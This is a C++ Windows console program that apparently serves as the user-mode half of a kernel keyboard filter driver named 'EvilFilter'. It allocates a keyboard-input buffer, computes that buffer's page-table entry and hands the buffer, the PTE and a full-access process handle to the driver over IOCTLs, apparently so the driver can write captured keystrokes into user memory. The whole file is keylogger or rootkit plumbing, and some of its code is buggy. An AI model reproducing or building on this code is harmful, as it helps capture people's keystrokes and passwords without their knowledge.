// ConsoleApplication2.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
//#include <ntddkbd.h>
#include <SharedHeader.h>
//#include <ntdef.h>

VOID WaitAMinute() {
	printf("Waiting a minute...");
	SYSTEMTIME systemTime;
	GetSystemTime(&systemTime);
	WORD CurrentMinute = systemTime.wMinute;
	WORD ExitMinute = systemTime.wMinute + 2;
	//while (FALSE) {
	while (CurrentMinute != ExitMinute) {
		GetSystemTime(&systemTime);
		CurrentMinute = systemTime.wMinute;
	}
	printf("done waiting\n");
}

int main(int argc, _TCHAR* argv[]) {
//#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_BUFFERED, FILE_READ_DATA)
#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
	HANDLE hControlDevice;
ULONG  bytes;

//
// Open handle to the control device. Please note that even
// a non-admin user can open handle to the device with
// FILE_READ_ATTRIBUTES | SYNCHRONIZE DesiredAccess and send IOCTLs if the
// IOCTL is defined with FILE_ANY_ACCESS. So for better security avoid
// specifying FILE_ANY_ACCESS in your IOCTL defintions.
// If the IOCTL is defined to have FILE_READ_DATA access rights, you can
// open the device with GENERIC_READ and call DeviceIoControl.
// If the IOCTL is defined to have FILE_WRITE_DATA access rights, you can
// open the device with GENERIC_WRITE and call DeviceIoControl.
//
hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"),
	GENERIC_READ | GENERIC_WRITE, // Only read access
	FILE_SHARE_READ | FILE_SHARE_WRITE, //0, // FILE_SHARE_READ | FILE_SHARE_WRITE
	NULL, // no SECURITY_ATTRIBUTES structure
	OPEN_EXISTING, // No special create flags
	FILE_FLAG_OVERLAPPED, // 0 //  No special attributes
	NULL); // No template file

if (INVALID_HANDLE_VALUE == hControlDevice) {
	printf("Failed to open EvilFilter device\n");
}
else {

	PKEYBOARD_INPUT_DATA keyboardData;
	OVERLAPPED      DeviceIoOverlapped;
	PSHARED_MEMORY_STRUCT dataToTransmit;
	HANDLE currentProcessHandle;

	currentProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());

	keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
	dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);

	dataToTransmit->instruction = 'O';
	dataToTransmit->offset = 0;
	PPTE ppte = GetPteAddress(keyboardData);
	printf("PTPE is ", ppte);

	dataToTransmit->ClientProcessHandle = currentProcessHandle;
	dataToTransmit->ClientMemory = keyboardData;
	dataToTransmit->PageTable = ppte;

	DeviceIoOverlapped.Offset = 0;
	DeviceIoOverlapped.OffsetHigh = 0;
	DeviceIoOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);


	if (!DeviceIoControl(hControlDevice,
		IOCTL_CUSTOM_CODE,
		NULL, 0,
		dataToTransmit, SharedMemoryLength,
		&bytes, &DeviceIoOverlapped)) {
		printf("Ioctl to EvilFilter device failed\n");
	}
	else {
		printf("Ioctl to EvilFilter device succeeded\n");
		printf("keyboardData is [0x%lx]\n", keyboardData);


	}
	ULONG kmdfOffset = dataToTransmit->offset;
	ULONG keyboardOffset = (ULONG)keyboardData & 0x0fff;
	printf("offsets are [0x%lx] [0x%lx]\n", kmdfOffset, keyboardOffset);


	keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
	keyboardOffset = (ULONG)keyboardData & 0x0fff;
	printf("address is [0x%lx] offsets are [0x%lx] [0x%lx]\n", keyboardData, kmdfOffset, keyboardOffset);
	ULONG count = 0;

	PLLIST listNode;
	listNode = (PLLIST)malloc(sizeof(LLIST));
	listNode->keyboardBuffer = keyboardData;
	listNode->previous = NULL;
	while (keyboardOffset != kmdfOffset) {
		count++;
		printf("Offsets do not match...lets do it again...");
		keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
		keyboardOffset = (ULONG)keyboardData & 0x0fff;
		printf("address is [0x%lx] offsets are [0x%lx] [0x%lx]\n", keyboardData, kmdfOffset, keyboardOffset);
		PLLIST previousListNode = listNode;
		listNode = (PLLIST)malloc(sizeof(LLIST));
		listNode->keyboardBuffer = keyboardData;
		listNode->previous = previousListNode;
	}
	printf("keyboardData is [0x%lx] - it took %lu tries to get here\n", keyboardData, count);

	printf("freeing unused memory...\n");
	while (listNode != NULL) {
		printf("[%lu]", count--);
		PLLIST currentListNode = listNode;
		listNode = listNode->previous;
		if (currentListNode->keyboardBuffer != keyboardData) {
			free(currentListNode->keyboardBuffer);
		}
		free(currentListNode);
	}


		ppte = GetPteAddress(keyboardData);
		printf("PTPE is [0x%lx]\n", ppte);

		dataToTransmit->ClientProcessHandle = currentProcessHandle;
		dataToTransmit->ClientMemory = keyboardData;
		dataToTransmit->PageTable = ppte;
		dataToTransmit->instruction = 'E';
		WaitAMinute();

		if (!DeviceIoControl(hControlDevice,
			IOCTL_CUSTOM_CODE,
			NULL, 0,
			dataToTransmit, SharedMemoryLength,
			&bytes, &DeviceIoOverlapped)) {
			printf("Ioctl to EvilFilter device failed\n");
		}
		else {
			printf("Ioctl to EvilFilter device succeeded\n");
			//printf("keyboardData is [0x%lx]\n", keyboardData);

		}
		CloseHandle(hControlDevice);
	}
	return 0;
}


PPTE GetPteAddress(PVOID virtualaddr) {

	ULONG pageDirectoryIndex = (ULONG)virtualaddr >> 21;
	ULONG pageTableIndex = (ULONG)virtualaddr >> 12 & 0x01FF;
	ULONG offset = (ULONG)virtualaddr & 0x0fff;
	printf("\n\nVirtualAddress [0x%lx] is [0x%lx] [0x%lx] [0x%lx]\n", virtualaddr, pageDirectoryIndex, pageTableIndex, offset);
	printf("Looking conventional \n");

	PPTE pageDirectoryTable = (PPTE)(PROCESS_PAGE_DIRECTORY_BASE + (pageDirectoryIndex * PTE_SIZE));
	printf("pageDirectoryTable   [0x%lx] ", pageDirectoryTable);
	if ((pageDirectoryTable)) {
		//printf("[0x%lx] ", MmGetPhysicalAddress(pageDirectoryTable));
//		ULONG pdPFN = pageDirectoryTable->PageFrameNumber;
//		printf("  PageFrameNumber is [0x%lx]\n", pdPFN);
		PPTE pageTable = (PPTE)(PROCESS_PAGE_TABLE_BASE + (pageTableIndex * PTE_SIZE) + (PAGE_SIZE * pageDirectoryIndex));
		printf("pageTable   [0x%lx] \n", pageTable);
		if ((pageTable)) {
			return pageTable;
		}
		else {
			printf(" is INVALID\n");
			return NULL;
		}
	}
	else {
		printf(" is INVALID\n");
		return NULL;
	}
}

